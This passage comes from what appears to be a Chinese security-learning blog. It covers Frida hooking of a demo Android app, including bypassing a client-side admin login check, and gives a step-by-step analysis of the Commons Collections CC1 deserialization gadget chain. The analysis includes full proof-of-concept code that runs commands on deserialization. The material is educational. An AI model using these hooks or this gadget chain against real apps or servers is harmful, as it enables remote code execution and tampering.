阶段二.在1的基础上对数据进行修改，执行流程的控制，核心方法的调用 阶段三.在2的基础上实现对核心方法的封装调用,提供对外服务接口 安装 frida python3 -m pip install frida-tools frida-server 要和frida对应 https://github.com/frida/frida/releases 安卓手机架构 adb shell getprop ro.product.cpu.abi 给与权限然后运行 adb push frida-server-15.1.17-android-arm /data/local/tmp adb shell chmod 755 /data/local/tmp/frida-server-15.1.17-android-x86 ./frida-server-14.2.18-android-arm /data/local/tmp/frida-server-15.1.17-android-x86 端口映射 adb forward tcp:27042 tcp:27042 adb forward tcp:27043 tcp:27043 查看进程，成功即可 frida-ps -U frida对指定方法进行trace frida-ps -U | grep frida frida-trace -i &quot;open&quot; -U &quot;cn.gemini.k.fridatest&quot; 用的比较多都是frida帮我们生成好了hook代码，直接拿来使用就行，简单方便，但有时候我们想自己定制些功能怎么办? 编写js进行hook 接下来看下如何通过编写js代码来实现对安卓APP中某些方法的hook。 在hook之前首先要熟悉我们需要hook的目标方法，应用包名，参数等基础信息。这里简单写了个demo，后面我们都通过这个demo来学习。 package com.example.frida; import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Log; public class MainActivity extends AppCompatActivity { private String total = &quot;@@@###@@@&quot;; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); while (true){ try { Thread.sleep(1000); } catch (InterruptedException e) { e.printStackTrace(); } fun(50,30); Log.d(&quot;Minhal.string&quot; , fun(&quot;Fuck U!!!!!!!!!&quot;)); } } void fun(int x , int y ){ Log.d(&quot;Minhal.Sum&quot; , String.valueOf(x+y)); } String fun(String x){ total +=x; return x.toLowerCase(); } String secret(){ return total; } } 整理一下hook时需要的信息： 目标应用的包名：“cn.gemini.k.fridatest”（一般在AndroidManifest.xml文件中可以找到） 目标方法所在类的类名：“cn.gemini.k.fridatest.FridaHook1”; 最后是目标方法名和参数：public int func1_add(int a,int b) 没有源码的情况下这些信息都可以通过反编译工具jadx或jeb获取。 hook参数、修改结果（重载、隐藏函数的处理） 接下来开始编写hook代码，首先是python文件 import time import frida # 连接安卓机上的frida-server device = frida.get_usb_device(10) # 启动`demo02`这个app pid = device.spawn([&quot;com.example.frida&quot;]) device.resume(pid)#通过pid重新启动 time.sleep(1) session = device.attach(pid) # 加载1.js脚本 with open(&quot;1.js&quot;) as f: script = session.create_script(f.read())#上一步连接到的session 去执行js script.load() # 脚本会持续运行等待输入 input() 1.js脚本内容 console.log(&quot;Script loaded successfully &quot;); Java.perform(function x() { console.log(&quot;Inside java perform function&quot;); //定位类 console.log(&quot;begin&quot;); Java.choose(&quot;com.example.frida.MainActivity&quot; , { onMatch : function(instance){ //该类有多少个实例，该回调就会被触发多少次 console.log(&quot;Found instance: &quot;+instance); console.log(&quot;Result of secret func: &quot; + instance.secret()); }, onComplete:function(){} }); console.log(&quot;end&quot;); var my_class = Java.use(&quot;com.example.frida.MainActivity&quot;); var string_class = Java.use(&quot;java.lang.String&quot;); //获取String类型 console.log(&quot;Java.Use.Successfully!&quot;);//定位类成功！ //在这里更改类的方法的实现（implementation） my_class.fun.overload(&quot;int&quot; , &quot;int&quot;).implementation = function(x,y){ //打印替换前的参数 console.log( &quot;original call: fun(&quot;+ x + &quot;, &quot; + y + &quot;)&quot;); //把参数替换成2和5，依旧调用原函数 var ret_value = this.fun(2, 5); return ret_value; } my_class.fun.overload(&quot;java.lang.String&quot;).implementation = function(x){ console.log(&quot;*************************************&quot;); var my_string = string_class.$new(&quot;lyyy&quot;); //new一个新字符串 console.log(&quot;Original arg: &quot; +x ); var ret = this.fun(my_string); // 用新的参数替换旧的参数，然后调用原函数获取结果 console.log(&quot;Return value: &quot;+ret); console.log(&quot;*************************************&quot;); return ret; }; }); 执行python脚本，这里需要提前启动frida-server adb shell /data/local/tmp/frida-server-15.1.17-android-x86 这里成功将参数以及返回结果修改为lyyy 远程调用 这个实例主要是实现在py脚本中也可以调用secret函数。这里主要是使用的frida提供的RPC功能（Remote Procedure Call） apk文件还是上一个样例的文件。 现在修改下js脚本。 console.log(&quot;Script loaded successfully &quot;); function callsecretFun(){ Java.perform(function x() { console.log(&quot;Inside java perform function&quot;); //定位类 console.log(&quot;begin&quot;); Java.choose(&quot;com.example.frida.MainActivity&quot; , { onMatch : function(instance){ //该类有多少个实例，该回调就会被触发多少次 console.log(&quot;Found instance: &quot;+instance); console.log(&quot;Result of secret func: &quot; + instance.secret()); }, onComplete:function(){} }); console.log(&quot;end&quot;); }); } rpc.exports = { callsecretfunction:callsecretFun//把callSecretFun函数导出为callsecretfunction符号，导出名不可以有大写字母或者下划线 }; 对应python import time import frida # 连接安卓机上的frida-server device = frida.get_usb_device(10) # 启动`demo02`这个app pid = device.spawn([&quot;com.example.frida&quot;]) device.resume(pid) time.sleep(1) session = device.attach(pid) # 加载s1.js脚本 with open(&quot;2.js&quot;) as f: script = session.create_script(f.read()) script.load() command = &quot;&quot; while 1 == 1: command = input(&quot;Enter command:\\n1: Exit\\n2: Call secret function\\nchoice:&quot;) if command == &quot;1&quot;: break elif command == &quot;2&quot;: #在这里调用 script.exports.callsecretfunction() 成功的调用了secret函数 打印了@@@###@@@ 动态修改 这里主要实现的功能不仅仅是可以用python调用app的函数。还要做到把数据从app传到python程序中，通过python代码修改传回到app里。 app代码： import androidx.appcompat.app.AppCompatActivity; import android.os.Bundle; import android.util.Base64; import android.view.View; import android.widget.EditText; import android.widget.TextView; public class MainActivity extends AppCompatActivity { EditText username_et; EditText password_et; TextView message_tv; @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); password_et = (EditText) this.findViewById(R.id.editText2); username_et = (EditText) this.findViewById(R.id.editText); message_tv = ((TextView) findViewById(R.id.textView)); this.findViewById(R.id.button).setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { if (username_et.getText().toString().compareTo(&quot;admin&quot;) == 0) { message_tv.setText(&quot;You cannot login as admin&quot;); return; } //hook target message_tv.setText(&quot;Sending to the server :&quot; + Base64.encodeToString((username_et.getText().toString() + &quot;:&quot; + password_et.getText().toString()).getBytes(), Base64.DEFAULT)); } }); } } activity_main.xml文件 1.id要对应 2.页面挤压时用 &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; xmlns:app=&quot;http://schemas.android.com/apk/res-auto&quot; xmlns:tools=&quot;http://schemas.android.com/tools&quot; android:layout_width=&quot;match_parent&quot; android:layout_height=&quot;match_parent&quot; tools:context=&quot;.MainActivity&quot;&gt; &lt;Button android:id=&quot;@+id/button&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;4dp&quot; android:layout_marginTop=&quot;55dp&quot; android:text=&quot;login&quot; app:layout_constraintStart_toStartOf=&quot;parent&quot; app:layout_constraintTop_toBottomOf=&quot;@+id/editTextTextPersonName2&quot; /&gt; &lt;EditText android:id=&quot;@+id/editTextTextPersonName&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10dp&quot; android:layout_marginTop=&quot;150dp&quot; android:layout_marginBottom=&quot;150dp&quot; android:ems=&quot;10&quot; android:inputType=&quot;textPersonName&quot; android:text=&quot;Name&quot; app:layout_constraintBottom_toBottomOf=&quot;@+id/editTextTextPersonName2&quot; app:layout_constraintStart_toStartOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt; &lt;EditText android:id=&quot;@+id/editTextTextPersonName2&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;10dp&quot; android:layout_marginTop=&quot;300dp&quot; android:ems=&quot;10&quot; android:inputType=&quot;textPersonName&quot; android:text=&quot;passowrd&quot; app:layout_constraintStart_toStartOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt; &lt;TextView android:id=&quot;@+id/textView3&quot; android:layout_width=&quot;wrap_content&quot; android:layout_height=&quot;wrap_content&quot; android:layout_marginStart=&quot;4dp&quot; android:layout_marginTop=&quot;16dp&quot; android:text=&quot;adminmanager&quot; app:layout_constraintStart_toStartOf=&quot;parent&quot; app:layout_constraintTop_toTopOf=&quot;parent&quot; /&gt; &lt;/androidx.constraintlayout.widget.ConstraintLayout&gt; 接下来操作是python代码获取输入内容，并修改输入内容然后传输到app，通过验证。（包括admin） js代码主要实现是先截到输入内容，传输到python代码，然后等python传入新数据继续执行。 js代码 console.log(&quot;Script loaded successfully &quot;); Java.perform(function () { var tv_class = Java.use(&quot;android.widget.textView3&quot;); tv_class.setText.overload(&quot;java.lang.CharSequence&quot;).implementation = function (x) { var string_to_send = x.toString(); var string_to_recv; console.log(&quot;Script loaded successfully &quot;); send(string_to_send); // 将数据发送给python的python代码 recv(function (received_json_object) { string_to_recv = received_json_object.my_data console.log(&quot;string_to_recv: &quot; + string_to_recv); }).wait(); //收到数据之后，再执行下去 var my_string = Java.use(&quot;java.lang.String&quot;).$new(string_to_recv); this.setText(my_string); } }); python代码 import time import frida import base64 def my_message_handler(message, payload): print(message) print(payload) if message[&quot;type&quot;] == &quot;send&quot;: print (message[&quot;payload&quot;]) data = message[&quot;payload&quot;].split(&quot;:&quot;)[1].strip() print(data) print ('message:', message) data = str(base64.b64decode(data)) user,pw = data.split(&quot;:&quot;) print(&quot;user:&quot;,user) data =str(base64.b64encode((&quot;admin&quot; + &quot;:&quot; + pw).encode())) print (&quot;encoded data:&quot;, data) script.post({&quot;my_data&quot;: data}) # 将JSON对象发送回去 print (&quot;Modified data sent&quot;) # 连接安卓机上的frida-server device = frida.get_usb_device(10) # 启动`demo02`这个app pid = device.spawn([&quot;com.example.frida&quot;]) device.resume(pid) time.sleep(1) session = device.attach(pid) # 加载a.js脚本 with open(&quot;3.js&quot;) as f: script = session.create_script(f.read()) script.on(&quot;message&quot;, my_message_handler) script.load() input() 直接运行python代码，然后输入新的用户名和密码，我们原程序是本来不可以输入admin的，我们本代码就是通过输入其他内容，通过frida更改他的用户名参数，使得输入内容用户名为admin。 执行结果如下： 就是绕过了if语句提交了用户名为admin的post请求 if (username_et.getText().toString().compareTo(&quot;admin&quot;) == 0) { message_tv.setText(&quot;You cannot login as admin&quot;); return; } 实现了动态内容的修改 objection-frida_api调用 python3 -m pip install objection 1.1 获取基本信息 首先介绍几个基本操作： 键入命令之后，回车执行； help：不知道当前命令的效果是什么，在当前命令前加help比如，help env，回车之后会出现当前命令的解释信息； 按空格：不知道输入什么就按空格，会有提示出来，上下选择之后再按空格选中，又会有新的提示出来； jobs：作业系统很好用，建议一定要掌握，可以同时运行多项(hook)作业； 我们以安卓内置应用“设置”为例，来示范一下基本的用法。 在手机上启动frida-server，并且点击启动“设置”图标，手机进入设置的界面，首先查看一下“设置”应用的包名。 frida-ps -U 再使用objection注入“设置”应用。 objection -g com.android.settings explore 启动objection之后，会出现提示它的logo，这时候不知道输入啥命令的话，可以按下空格，有提示的命令及其功能出来；再按空格选中，又会有新的提示命令出来，这时候按回车就可以执行该命令 1.2 提取内存信息 查看内存中加载的库 运行命令memory list modules 查看库的导出函数 运行命令memory list exports libssl.so 将结果保存到json文件中 当结果太多，终端无法全部显示的时候，可以将结果导出到文件中，然后使用其他软件查看内容 # memory list exports libart.so --json /root/libart.json Writing exports as json to /root/libart.json... Wrote exports to: /root/libart.json 提取整个(或部分)内存 命令是memory dump all from_base，这部分内容与下文脱壳部分有重叠，我们在脱壳部分介绍用法。 搜索整个内存 命令是memory search --string --offsets-only，这部分也与下文脱壳部分有重叠，我们在脱壳部分详细介绍用法。 Android APP开发 下载 https://developer.android.com/studio 将代码放入MainActivity 且用adb连接上模拟器之后run即可 ","link":"https://liangyueliangyue.github.io/post/app-shen-tou-ce-shi-xue-xi/"},{"title":"yso之CC1链","content":"前言 Commons Collections的利用链也被称为cc链，在学习反序列化漏洞必不可少的一个部分。Apache Commons Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。 Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。 环境 因为java 8u71之后已修复不可利用，所以安装了jdk7u80 Apache-Common-Collections-3.1 反射知识 CC链不像URLDNS简单，需要利用到反射机制 Java反射机制：是指在运行时去获取一个类的变量和方法信息。然后通过获取到的信息来创建对象，调用方法的一种机制。 我们可以通过反射命令执行的简单例子来进行理解 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); c1.getMethod(&quot;exec&quot;, String.class).invoke(c1.getMethod(&quot;getRuntime&quot;).invoke(c1), &quot;calc.exe&quot;); } 这是能成功打开计算器的代码 我们可以将它拆解为正常的反射流程 1.首先获取Class类对象，这里使用的是Class类中的静态方法forName 还有常见的其他两种方法，这里不细讲 使用类的calss属性来获取该类对于的class对象。 用对象的getClass()方法，返回该对象所属类对应的Class对象 public static void main(String[] args) throws ClassNotFoundException{ Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); } 2.然后在Class类中用getConstructor获取构造方法，然后通过newInstance获取对象 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); Constructor con1 = c1.getConstructor(); Object o1 = con1.newInstance(); } 到这一步就已经出现问题 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-Vatlf4lv-1643030725723)(http://image.liangyueliangyue.top//img202201242125349.png)] 写一个Runtime步进，Runtime的构造方法为私有的 getConstructor()方法只能获取所有公共构造方法对象的数组 这时候我们可以通过getDeclaredConstructor()方法来获取类的私有构造方法 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); Constructor con1 = c1.getDeclaredConstructor(); Object o1 = con1.newInstance(); } 但是能够获取到并不意味能够通过私有方法创建对象 这里需要用到java的暴力反射 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); Constructor con1 = c1.getDeclaredConstructor(); con1.setAccessible(true); Object o1 = con1.newInstance(); } 通过setAccessible设置值为ture来取消访问检查 成功执行后继续通过getMethod()获取对象的存在方法 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); Constructor con1 = c1.getDeclaredConstructor(); con1.setAccessible(true); Object o1 = con1.newInstance(); Method m1 = c1.getMethod(&quot;exec&quot;, String.class); } invoke调用obj对象的成员方法 public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException { Class c1 = Class.forName(&quot;java.lang.Runtime&quot;); Constructor con1 = c1.getDeclaredConstructor(); con1.setAccessible(true); Object o1 = con1.newInstance(); Method m1 = c1.getMethod(&quot;exec&quot;, String.class); m1.invoke(o1,&quot;calc.exe&quot;); } 成功弹出计算器，但是在高版本（&gt;=jdk11）虽然能够执行但是会给出warning 最回到例子来，可以看出它根本没有调用过newInstance函数，那么它invoke的对象是怎么生成的？ c1.getMethod(&quot;getRuntime&quot;).invoke(c1) Runtime类可以通过 getRuntime() 来获取到 Runtime 对象，而invoke 的作用是执行方法 但是它有不同的用法 如果这个方法是普通方法，那么第一个参数是类对象 如果这个方法是静态方法，那么第一个参数是类或者用null代替 而getRuntime() 是静态方法，所以它的参数是一个类（或是null）而不是类对象，所以不需要去生成类对象来进行调用 反射机制讲究的就是动态性，由于这种动态性，可以极大的增强程序的灵活性，程序不用在编译期就完成确定，在运行期仍然可以扩展。但也正因为如此才会被广泛的利用。 CC-POC复现 先用idea创建maven项目 导入cc依赖 &lt;dependencies&gt; &lt;dependency&gt; &lt;groupId&gt;commons-collections&lt;/groupId&gt; &lt;artifactId&gt;commons-collections&lt;/artifactId&gt; &lt;version&gt;3.1&lt;/version&gt; &lt;/dependency&gt; &lt;/dependencies&gt; 然后新建Poc.java import org.apache.commons.collections.*; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class Poc { public static void main(String[] args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}) }; //将transformers数组存入ChaniedTransformer这个继承类 Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChina Map innerMap = new HashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); //给予map数据转化链 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞 Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式 onlyElement.setValue(&quot;foobar&quot;); } } 直接运行弹出计算器 CC-POC解析 布局 //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码 Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] }), new InvokerTransformer(&quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] }), new InvokerTransformer(&quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;}) }; 开始构建了一个Transformer的数组，而Transformer是一个接口，所以transformers是一个接口数组 数组的内容是通过实现了Transformer接口的类来创建的对象 首先看ConstantTransformer类 使用构造方法传入参数（Runtime类对象） 再来看InvokerTransformer类，从注释中就能知道这个类是拿来生成新对象的 /** * Transformer implementation that creates a new object instance by reflection. * * @since Commons Collections 3.0 * @version $Revision: 1.7 $ $Date: 2004/05/26 21:44:05 $ * * @author Stephen Colebourne */ 三个调用了同样的构造方法 iMethodName、iParamTypes、iArgs来自于构造方法 第一个参数是方法名，第二个参数是参数类型，第三个是参数值，将参数提取一下 &quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] } &quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] } &quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;} 再来看下面的 Transformer transformerChain = new ChainedTransformer(transformers); 创建了ChainedTransformer，传入参数为接口数组 构造函数也是将接口数组赋值给iTransformers变量 创建HashMap并传入一个键值对 Map innerMap = new HashMap(); innerMap.put(&quot;value&quot;, &quot;value&quot;); 再看下面 Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 通过TransformedMap类的decorate方法得到了一个TransformedMap对象outerMap 分析一下TransformedMap 存在构造方法但是是protected保护的，所以需要通过decorate提供一个实例化对象。 keyTransformer传值为null，valueTransformer为transformerChain对象 然后通过一系列方法获取到outerMap的第一个键值对并转换成Map.Entry形式赋值给onlyElement Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next(); 然后就到了关键的漏洞触发点，打上断点开始调试 ①步入调用了parent的checkSetValue方法 ②而这里因为onlyElement是outerMap(TransformedMap对象)entrySet获得的，所以parent是TransformedMap，从而调用了TransformedMap类中的checkSetValue方法 ③checkSetValue又调用了valueTransformer类中的transform方法，参数为新设置的value值对象 那么这个valueTransformer是什么类？ crtl点击发现是一个常量 那么肯定是构造时就定义好的，找到构造方法确认参数为第三个 而我们又是通过decorate方法调用构造方法 POC中调用decorate时传入的第三个值正是transformerChain对象（由ChainedTransformer得到） Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); 所以这里调用的是ChainedTransformer类中的transform方法，再步入 ④用for循环遍历了iTransformers，将里面的对象都调用transform方法依次返回 而iTransformers值在上面对象的创建时就已经知道是接口数组 ⑤再步入，首先调用的是ConstantTransformer类的transform方法 在上面创建时也讲到了，直接是我们提供的Runtime.class（类名） ⑥步入到下一次循环 这时候object已经通过ConstantTransformer类的transform方法变成了我们提供的Runtime类 然后再三次调用InvokerTransformer类的transform方法，这个方法中会尝试反射 通过getClass()获取类，getMethod()获取方法，invoke反射调用方法（这些都在前面基础讲过） 这里的iMethodName，iParamTypes，iArgs全部在创建时定义（可控） 第一次反射 &quot;getMethod&quot;, new Class[] {String.class, Class[].class }, new Object[] {&quot;getRuntime&quot;, new Class[0] } 此时的input为Runtime类对象 [外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-S7UC2b4E-1643030725743)(http://image.liangyueliangyue.top//img202201242125370.png)] 调用input.getClass() =&gt; Runtime.class.getClass()得到了java.lang.Class类，获取我们传入的getMethod方法 调用了Runtime类对象中getMethod的方法，参数为&quot;getRuntime&quot;, new Class[0] 那么最终返回的就是Runtime类中的getRuntime方法了 第二次反射 &quot;invoke&quot;, new Class[] {Object.class, Object[].class }, new Object[] {null, new Object[0] } 此时的input为getRuntime方法对象 调用input.getClass() 得到了java.lang.reflect.Method类,获取我们传入的invoke方法 调用了getRuntime方法对象中invoke的方法，参数为null, new Object[0] 那么最终返回的就是getRuntime方法对象执行invoke参数为null 上面讲到过当invoke调用静态方法时需要令第一个参数为类或者null，所以这里只是为了调用静态方法getRuntime 那么最终返回的就是Runtime对象了 第三次反射 &quot;exec&quot;, new Class[] {String.class }, new Object[] {&quot;calc.exe&quot;} 此时的input为Runtime对象 调用input.getClass() 得到了java.lang.Runtime类,获取我们传入的exec方法 调用了Runtime对象中exec的方法，参数为calc.exe，成功弹出计算器 到这里就完成了这个POC的分析 疑问 为什么不直接利用反射命令执行，而是构造一个transformers 数组通过Runtime.class去不断反射执行 因为Java 要能完成序列化与反序列化要求这个被序列化的类有继承Serializable，而Runtime类没有继承，所以直接使用就会报错。 而Runtime.class是属于java.lang.Class ，java.lang.Class 是实现了java.io.Serializable 接⼝的。可以被序列化。 利用链 最后的调用栈简化 Map.Entry-&gt;setValue() TransformedMap-&gt;checkSetValue() ChainedTransformer-&gt;transform() InvokerTransformer-&gt;transform() yso的CC1分析 在实际运用中需要将代码转换为序列化流然后再让服务器成功readObject读取我们序列化的流文件完成反序列化最终命令执行。 所以根据yso的CC1链去学习实际运用的特殊情况以及利用方法 首先是利用链和环境需求 /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections */ 可以看到后面的利用是一样的，只是前面多了很多步,反着推 首先看LazyMap类的get方法，这里他取代了TransformedMap，那么它肯定有办法去调用指定类的transform方法 来到get函数，首先判断是否该Map是否已经存在key，没有的话就调用factory.transform()进行处理 而factory又是常量，那么肯定在构造函数中定义 而构造函数是protected，提供了decorate方法来创建对象 这里第二个decorate方法是符合我们的要求的（factory是实现Transformer接口的类） 那么万事俱备只欠东风，我们要去寻找一个类，在对象进行反序列化时会调用我们精心构造对象的get(Object)方法。 而sun.reflect.annotation.AnnotationInvocationHandler 的 invoke()方法满足条件 在invoke()中，判断var2方法的形参个数为0且var2的方法名（var=var2.getName()）不为toString,hashCode或者annotationType则会触发this.memberValues.get() 在找到this.memberValues的赋值点 构造方法中的var2构造为LazyMap即可触发漏洞，那么接下来找谁能够调用触发AnnotationInvocationHandler.invoke() 也就是入口处的AnnotationInvocationHandler类的重写后的readObject readObject中调用了this.memberValues的entrySet方法。跟invoke方法有什么关系？ 这里用到了java的动态代理知识点 简单的说就是执行代理对象任何方法都会先触发代理对象对应handler的invoke方法。 如果这里的memberValues是个代理对象，那么就会调用memberValues对应handler的invoke方法 所以我们设置一个代理对象，然后将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。 动态代理执行invoke ①在调用readObject反序列化处理时，会触发AnnotationInvocationHandler重写后的readObject方法 ②然后调用了this.memberValues.entrySet，而this.memberValues是之前构造好的代理对象，所以调用其方法时，会去调用其创建代理时设置的handler的invoke方法。 ③而这个代理对象设置的handler为这个InvocationHandler这个类产生的对象，接着会调用他的invoke方法 ④InvocationHandler的invoke方法中调用了this.memberValues#get，此时的this.memberValues为之前设置好的lazymap，所以这里调用的是lazymap#get 然后就是之前分析的调用链，就这样自己本地实现一下简单的序列化反序列化 本地实现 public static void main(String[] args) throws Exception { //布局 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(java.lang.Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[]{}}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String[].class}, new Object[]{new String[]{&quot;calc.exe&quot;}})}; //利用ChainedTransformer链接 ChainedTransformer TransformerChain = new ChainedTransformer(transformers); //LazyMap中get存在transform入口 Map hashMap = new HashMap(); Map lazyMap = LazyMap.decorate(hashMap, TransformerChain); //因为sun.reflect.annotation.AnnotationInvocationHandler的构造方法不是public, 要通过反射构造出来。 //赋值this.memberValues为lazyMap(也就是代理对象为lazyMap)，且var1满足条件才能触发触发this.memberValues.get() Constructor con1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); con1.setAccessible(true); InvocationHandler ih = (InvocationHandler) con1.newInstance(Override.class, lazyMap); //最后一步就是创建动态代理，传入InvocationHandler，反序列化时会调用memberValues的entrySet方法，会首先触发InvocationHandler的invoke方法 Object proxy = Proxy.newProxyInstance(ih.getClass().getClassLoader(), new Class[]{Map.class}, ih); Constructor con2 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); con2.setAccessible(true); Object ih2 = con2.newInstance(Override.class, proxy); //序列化和反序列化 ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;exp&quot;)); oos.writeObject(ih2); oos.flush(); oos.close(); FileInputStream fis = new FileInputStream(&quot;exp&quot;); ObjectInputStream ois = new ObjectInputStream(fis); // readObject触发 Object newObj = ois.readObject(); ois.close(); } 还有一个点没有说，就是var1满足的条件 来到AnnotationInvocationHandler类的构造方法，第⼀个参数是⼀个Annotation类类型参数，第二个是map类型参数。 存在if判断，不满足不会赋值且报错 isAnnotation()方法用于检查此Class对象是否表示注释类型。 getInterfaces().length==1 =&gt; 只实现了一个接口 getInterfaces()[0]==Annotation.class =&gt; 实现Annotation接口 因为继承了Annotation所以后面两个自然满足，只需要找到java自带的注解类即可 Deprecated.class Override.class SuppressWarnings.class yso动态代理处理 yso利用了Gadgets类来处理动态代理 final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); 原理是一样的，步入createMemoitizedProxy public static &lt;T&gt; T createMemoitizedProxy ( final Map&lt;String, Object&gt; map, final Class&lt;T&gt; iface, final Class&lt;?&gt;... ifaces ) throws Exception { return createProxy(createMemoizedInvocationHandler(map), iface, ifaces); } 在createMemoitizedProxy方法中又调用了createMemoizedInvocationHandler(map) public static InvocationHandler createMemoizedInvocationHandler ( final Map&lt;String, Object&gt; map ) throws Exception { return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map); } ANN_INV_HANDLER_CLASS常量 所以和自己构造是一样的①和②等价 ①final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); ②Constructor con1 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); con1.setAccessible(true); InvocationHandler ih = (InvocationHandler) con1.newInstance(Override.class, lazyMap); //最后一步就是创建动态代理，传入InvocationHandler，反序列化时会调用memberValues的entrySet方法，会首先触发InvocationHandler的invoke方法 Object proxy = Proxy.newProxyInstance(ih.getClass().getClassLoader(), new Class[]{Map.class}, ih); ①final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); ②Constructor con2 = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).getDeclaredConstructor(Class.class, Map.class); con2.setAccessible(true); Object ih2 = con2.newInstance(Override.class, proxy); yso的其他操作 非预期命令执行 在调试自己构造的Poc时可能会遇到弹出两次计算器或者超前弹出了计算器 这是因为Idea在调试模式下会调用对象的toString方法，而我们构造了动态代理，但调用了代理对象的toString方法就会调用handler的invoke方法导致非预期的命令执行。 我们可以手动关闭调试时的调用，去掉红色框内的选项 而在yso中，为了解决这个问题，它在开始创建transformerChain常量时并没有放入执行代码 final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); 